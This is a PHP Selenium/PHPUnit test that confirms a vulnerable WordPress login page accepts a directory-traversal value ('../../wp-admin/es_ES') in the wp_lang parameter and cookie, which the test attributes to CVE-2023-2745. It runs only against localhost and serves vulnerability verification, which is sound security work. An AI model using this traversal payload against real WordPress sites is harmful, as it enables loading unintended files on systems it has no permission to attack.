<?php
declare(strict_types=1);

namespace TestsSelenium;

use Facebook\WebDriver\Remote\DesiredCapabilities;
use Facebook\WebDriver\Remote\RemoteWebDriver;
use Facebook\WebDriver\WebDriverBy;
use PHPUnit\Framework\TestCase;

/**
 * @group wplang
 * 
 * Pre-conditions for test:
 *   - Website default locale is set to 'en_EN' 
 *   - Default translations folder is 'wp-content/languages/'
 *   - English locale file is `wp-content/languages/en_EN.mo`
 *   - Spanish locale file 'es_ES.mo' is downloaded and put to `wp-admin/es_ES.mo` (Also could be any other folder)
 *   - All 'es_ES' locale files removed from 'wp-content/languages/'
 */
class wpLoginWpLangTest extends TestCase {

    private $serverUrl = 'http://localhost:4444';
    private $targetUrl = 'http://localhost:8889';
    private $driver;

    /**
     * There is another way of making tests extending Selenium2TestCase, but it did not work in 
     * my configuration, might be because of mac M1 selenium or chromedriver run specifics, 
     * thus I decided to use webdriver native methods
     */
    public function setUp(): void
    {
        parent::setUp();
        
        $capabilities = DesiredCapabilities::chrome();
        // https://github.com/giorgiosironi/phpunit-selenium/issues/439#issuecomment-561740660
        $capabilities->setCapability('chromeOptions', ['w3c' => false]);
        $this->driver = RemoteWebDriver::create($this->serverUrl, $capabilities);
    }
    
    public function tearDown(): void
    {
        $this->driver->quit();
    }

    /**
     * @testdox Confirm that vulnerable version of wordpress allows directory traverse via translation files (CVE-2023-2745)
     */
    public function testDirectoryTraverseViaTranslationFiles()
    {
        $this->driver->get($this->targetUrl . '/wp-login.php');
        $body = $this->driver->findElement(WebDriverBy::tagName('body'));
        $this->assertStringContainsString('Username or Email Address', $body->getText());

        $this->driver->manage()->deleteAllCookies();
        $this->driver->get($this->targetUrl . '/wp-login.php?wp_lang=es_ES');
        $body = $this->driver->findElement(WebDriverBy::tagName('body'));
        $this->assertStringContainsString('Username or Email Address', $body->getText());

        $this->driver->manage()->deleteAllCookies();
        $this->driver->get($this->targetUrl . '/wp-login.php?wp_lang=../../wp-admin/es_ES');
        $body = $this->driver->findElement(WebDriverBy::tagName('body'));
        $this->assertStringContainsString('Nombre de usuario o correo electrónico', $body->getText());
        $this->assertEquals(
            '../../wp-admin/es_ES',
            urldecode($this->driver->manage()->getCookieNamed('wp_lang')->getValue())
        );

        $this->driver->get($this->targetUrl . '/wp-login.php');
        $body = $this->driver->findElement(WebDriverBy::tagName('body'));
        $this->assertStringContainsString('Nombre de usuario o correo electrónico', $body->getText());
        $this->assertEquals(
            '../../wp-admin/es_ES',
            urldecode($this->driver->manage()->getCookieNamed('wp_lang')->getValue())
        );
    }
}
